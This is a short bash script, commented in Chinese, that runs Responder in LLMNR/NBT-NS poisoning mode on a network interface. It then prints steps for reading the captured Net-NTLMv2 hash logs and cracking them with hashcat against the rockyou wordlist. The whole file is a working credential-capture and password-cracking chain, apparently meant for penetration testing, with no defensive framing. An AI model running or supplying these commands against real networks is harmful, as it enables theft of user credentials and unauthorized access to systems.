#!/bin/bash
# Responder LLMNR/NBT-NS 投毒脚本

INTERFACE="eth0"
LOG_DIR="/usr/share/responder/logs"

echo "[*] 启动 Responder（监听模式，仅捕获不响应）"
# responder -I ${INTERFACE} -A

echo "[*] 启动 Responder（投毒模式）"
responder -I ${INTERFACE} -wrf

echo ""
echo "[*] 捕获到哈希后，查看日志："
echo "    ls ${LOG_DIR}/"
echo "    cat ${LOG_DIR}/HTTP-NTLMv2-*.txt"
echo ""
echo "[*] 使用 hashcat 破解捕获的 Net-NTLMv2："
echo "    hashcat -m 5600 ${LOG_DIR}/HTTP-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt"
